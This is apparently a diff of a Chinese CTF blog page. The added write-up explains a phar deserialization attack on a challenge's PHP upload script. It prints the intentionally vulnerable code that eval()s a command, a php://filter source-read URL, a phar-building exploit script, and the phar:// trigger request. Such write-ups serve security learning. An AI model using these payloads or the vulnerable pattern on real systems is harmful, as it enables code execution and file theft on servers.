+<p><img src="https://k1ng0fic3.github.io/images/sql24.png" alt="avatar"></p>
+<p>测试结果：若包含的文件以<code>home</code>或<code>upload</code>结尾，则在后面拼接上<code>.php</code>后包含；其他都被拼接上<code>.fxxkyou!</code></p>
+<p>那么根据提示读upload：<code>http://183.129.189.60:10009/home.php?file=php://filter/convert.base64-encode/resource=upload</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">		$ext = <span class="string">".txt"</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"[^a-z0-9]"</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('illegal filename!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">'size'</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('you are too big (′▽`〃)');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"move_uploaded_file('"</span>.$file[<span class="string">'tmp_name'</span>].<span class="string">"', '"</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">"');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">"file"</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"下面是你上传的文件：&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h5><p>在<code>upload</code>中</p>
+<blockquote>
+<p>$this-&gt;Filename = $_GET[‘name’];</p>
+</blockquote>
+<p>可见<code>$this-&gt;Filename</code>是可控的，可以通过<code>name</code>参数以get方式得到。</p>
+<p>分析最后上传部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"下面是你上传的文件：&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>file_get_contents()</code>使<code>$uploader</code>对象通过<code>__toString()</code>返回<code>$this-&gt;Filename</code>，由于phar://伪协议可以不依赖<code>unserialize()</code>直接进行反序列化操作，加之<code>$this-&gt;Filename</code>可控，因此此处<code>$this-&gt;Filename</code>配合phar反序列化后，<code>__destruct()</code>方法内<code>eval($this-&gt;cmd);</code>最终导致了远程代码执行。<br>由于<code>__destruct()方法</code>中，想要<code>eval($this-&gt;cmd);</code>的前提条件是<code>$this-&gt;token</code>和<code>$_SESSION[&#39;user&#39;]</code>相等。</p>
+<p>在<code>__construct()</code>方法中有以下两行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br></pre></td></tr></table></figure>
+
+<p>随便上传一个txt，回显</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql25.png" alt="avatar"></p>
+<p>得到的<code>GXY939d6b01691234e49fa8ec7eafb79a55</code>就是$_SESSION[‘user’]</p>
+<p>然后在本地生成phar文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> Uploader();</span><br><span class="line">$o-&gt;cmd = <span class="string">'highlight_file("/var/www/html/flag.php");'</span>; <span class="comment">//里面的命令不要出现单引号否侧生成phar会报错</span></span><br><span class="line">$o-&gt;Filename = <span class="string">'1'</span>;</span><br><span class="line">$o-&gt;token = <span class="string">'GXY939d6b01691234e49fa8ec7eafb79a55'</span>; <span class="comment">//$_SESSION['user']</span></span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"1.txt"</span>, <span class="string">"1"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://k1ng0fic3.github.io/images/sql26.png" alt="avatar"></p>
+<p>将此phar文件上传，获取路径</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql27.png" alt="avatar"></p>
+<p><code>/var/www/html/uploads/74def8c80bd66ac6e4585ea8fb35c9f4/GXY939d6b01691234e49fa8ec7eafb79a55.txt</code></p>
+<p>在路径前加上phar协议，用来作为name变量的值，访问即可。</p>
+<blockquote>
+<p>home.php?file=upload&amp;name=phar:///var/www/html/uploads/74def8c80bd66ac6e4585ea8fb35c9f4/GXY939d6b01691234e49fa8ec7eafb79a55.txt</p>
+</blockquote>
+<p>在跳转页面上随便上传一个文件，触发反序列化，得到flag</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql28.png" alt="avatar"></p>
+<h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><p><em>Nepnep</em>师傅们的思路，真是简单无比。<br>由于有</p>
+<blockquote>
+<p>echo file_get_contents($uploader);</p>
+</blockquote>
+<p>这行代码存在。上传后会显示出<code>$uploader</code>这个文件的内容，所以只要使<code>$this-&gt;Filename</code>为<code>flag.php</code>，然后随便传个东西就会得到flag了。</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql29.png" alt="avatar"></p>
+<p>此外还有颖奇师傅利用出题人在正则表达式处的匹配错误，利用一句话+蚁剑打的非预期，不再细说了。</p>
+<p>还是太菜了，要多多向Web大佬巨神们学习才行。</p>
 
       
 
@@ -380,7 +446,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://k1ng0fic3.github.io/2020/03/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://k1ng0fic3.github.io/2020/05/01/SQL%E6%B3%A8%E5%85%A5%E4%B8%89%E8%BF%9E/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -394,20 +460,15 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/03/05/%E5%8C%BA%E5%9D%97%E9%93%BE&%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/05/01/volatility%E6%8F%92%E4%BB%B6%E3%81%AE%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          区块链&amp;智能合约
+          volatility插件の笔记
         
       </div>
     </a>
   
-  
-    <a href="/2020/03/05/%E5%A4%A7%E4%B8%89%E9%80%89%E8%AF%BE%E5%BF%83%E5%BE%97/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">大三选课心得</div>
-      <i class="icon-circle-right"></i>
-    </a>
   
 </nav>
 
@@ -432,7 +493,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内存取证练习"><span class="toc-number">1.</span> <span class="toc-text">内存取证练习</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#以OtterCTF题目为例，Volatility为辅，进行内存取证方面应用的模拟和练习。"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">以OtterCTF题目为例，Volatility为辅，进行内存取证方面应用的模拟和练习。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#https-pan-baidu-com-s-1QVCp4a45sFQUkrX-D4fvUw"><span class="toc-number">1.0.0.0.2.</span> <span class="toc-text">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1QVCp4a45sFQUkrX-D4fvUw</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-9、"><span class="toc-number">1.0.0.0.3.</span> <span class="toc-text">1-9、</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入练习三连"><span class="toc-number">1.</span> <span class="toc-text">SQL注入练习三连</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#为了躲肺炎，在XCTF平台中の安恒杯-新春祈福赛中，找到了三个比较好的SQL注入题目"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目内容："><span class="toc-number">1.0.1.</span> <span class="toc-text">题目内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题解："><span class="toc-number">1.0.2.</span> <span class="toc-text">题解：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00：Babysqli-v1-0"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">0x00：Babysqli v1.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01：Babysqli-v2-0"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">0x01：Babysqli v2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml-报错注入原理："><span class="toc-number">1.0.2.2.1.</span> <span class="toc-text">updatexml()报错注入原理：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#floor-报错注入原理："><span class="toc-number">1.0.2.2.2.</span> <span class="toc-text">floor()报错注入原理：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02：Babysqli-v3-0"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">0x02：Babysqli v3.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#预期"><span class="toc-number">1.0.2.3.1.</span> <span class="toc-text">预期</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#非预期"><span class="toc-number">1.0.2.3.2.</span> <span class="toc-text">非预期</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
